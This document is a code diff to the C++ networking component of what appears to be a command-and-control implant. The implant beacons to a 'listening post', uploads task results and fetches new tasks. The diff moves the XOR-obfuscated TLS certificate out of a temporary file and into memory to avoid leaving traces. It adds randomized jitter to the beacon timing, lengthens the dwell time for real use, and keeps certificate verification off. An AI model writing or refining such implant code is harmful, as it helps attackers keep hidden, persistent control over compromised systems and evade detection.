@@ -3,7 +3,7 @@
 // #include "cert_embedded.h"
 # include "cert_encrypted.h"
 
-#include <fstream>
+// #include <fstream>
 #include <cstdio>
 #include <string>
 #include <string_view>
@@ -36,43 +36,22 @@ using json = nlohmann::json;
 [[nodiscard]] std::string sendHttpRequest(std::string_view host, 
     std::string_view port, 
     std::string_view uri, 
-    std::string_view payload) {
+    std::string_view payload,
+    const std::string& certPem) {
 
     auto const serverAddress = host;
     auto const serverPort = port;
     auto const serverUri = uri;
-    auto const httpVersion = 11;
     auto const requestBody = json::parse(payload);
 
-    //construct listening post endpoint URL
     std::stringstream ss;
     ss << XOR_STR("https://") << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
-    //write embedded cert to temporary file
-    // std::string tempCertPath = "/tmp/.cert.pem";
-    // {
-    //     std::ofstream certFile(tempCertPath, std::ios::binary);
-    //     certFile.write(reinterpret_cast<const char*>(cert_pem), cert_pem_len);
-    // }
-
-    std::string tempCertPath = "/tmp/.cert.pem"; //this is the path to temp cert file that will be written
-    // to and used for SSL connection, file is deleted after use
-    // the cert is XOR encrypted in the header file and decrypted here before writing to disk to make static 
-    // analysis more difficult (strings are easily extracted from binaries with tools like strings)
-    {
-        std::ofstream certFile(tempCertPath, std::ios::binary); //and this is the decryption loop so 
-        //there should not need to be decryption of the key elsewhere
-        for (unsigned i = 0; i < enc_cert_pem_len; ++i) {
-            char c = enc_cert_pem[i] ^ 0x55;
-            certFile.write(&c, 1);
-        }
-    }
-
     cpr::SslOptions sslOpts = cpr::Ssl(
-        cpr::ssl::VerifyHost{ false }, //change these to true once the certificates are fixed!
+        cpr::ssl::VerifyHost{ false },
         cpr::ssl::VerifyPeer{ false },
-        cpr::ssl::CaInfo{ std::move(tempCertPath) }
+        cpr::ssl::CaBuffer{ certPem }// directly from RAM
     );
 
     cpr::AsyncResponse asyncRequest = cpr::PostAsync(
@@ -82,15 +61,9 @@ using json = nlohmann::json;
         sslOpts  
     );
 
-    //retrieve response
     cpr::Response response = asyncRequest.get();
-
-    //show request contents
     DEBUG_LOG(XOR_STR("Request body: ") << requestBody);
-
-    //return body of the response from listening post, THIS IS WHERE NEW TASKS ARE RECEIVED
     return response.text;
-
 };
 
 //enable/disable the running status
@@ -102,7 +75,7 @@ void NetSession::setMeanDwell(double meanDwell) {
 }
 
 //send task results and receive new tasks
-[[nodiscard]] std::string NetSession::sendResults() {
+[[nodiscard]] std::string NetSession::sendResults(const std::string& certPem) {
     boost::property_tree::ptree resultsLocal;
     //scoped lock to perform swap
     {
@@ -113,7 +86,7 @@ void NetSession::setMeanDwell(double meanDwell) {
     std::stringstream resultsStringStream;
     boost::property_tree::write_json(resultsStringStream, resultsLocal);
     //contact listening posts with results, return received tasks
-    return sendHttpRequest(host, port, uri, resultsStringStream.str());
+    return sendHttpRequest(host, port, uri, resultsStringStream.str(), certPem);
 }
 
 void NetSession::parseTasks(const std::string& response) {
@@ -163,15 +136,22 @@ void NetSession::serviceTasks() {
 }
 
 //beaconing to listening post
-void NetSession::beacon() {
+void NetSession::beacon() { 
+    std::string certPem;
+    certPem.reserve(enc_cert_pem_len);
+    for (unsigned i = 0; i < enc_cert_pem_len; ++i) {
+        certPem.push_back(enc_cert_pem[i] ^ 0x55);
+    }
+
+    // Seed random generator once
+    std::random_device rd;
+    std::mt19937 rng(rd());
+    std::uniform_real_distribution<double> jitterDist(0.7, 1.3);// +/- 30%
+
     while (isRunning) {
-
-        //Try to contact listening post to send results/get tasks
-        //If tasks received, parse and store for async execution by task thread
-
         try {
             DEBUG_LOG("Implant sending results to listening post...");
-            const auto serverResponse = sendResults();
+            const auto serverResponse = sendResults(certPem);   // pass the buffer
             DEBUG_LOG("Listening post response content: " << serverResponse);
             DEBUG_LOG("Parsing tasks received...");
             parseTasks(serverResponse);
@@ -180,11 +160,16 @@ void NetSession::beacon() {
             DEBUG_LOG("Error occurred while beaconing: " << e.what());
         }
 
-        //sleep for set duration w/ jitter and beacon again later
-        const auto sleepTimeDouble = dwellDistributionSeconds(device);
-        const auto sleepTimeChrono = std::chrono::seconds{ static_cast<unsigned long long>(sleepTimeDouble) };
-
-        std::this_thread::sleep_for(sleepTimeChrono);    
+        // Base dwell from exponential distribution
+        double baseDwell = dwellDistributionSeconds(device);
+        // Apply jitter 
+        double jitteredDwell = baseDwell * jitterDist(rng);
+        // Convert to chrono seconds 
+        auto sleepDuration = std::chrono::seconds{
+            static_cast<unsigned long long>(std::max(1.0, jitteredDwell))
+        };
+        
+        std::this_thread::sleep_for(sleepDuration);
     }
 }
 
@@ -195,7 +180,7 @@ NetSession::NetSession(std::string host, std::string port, std::string uri) :
     uri{ std::move(uri) },
 
     isRunning{ true },
-    dwellDistributionSeconds{ 10. } //make this longer for real case (~ >200)
+    dwellDistributionSeconds{ 250 } //make this longer for real case (~ >200)
 {
 }
 
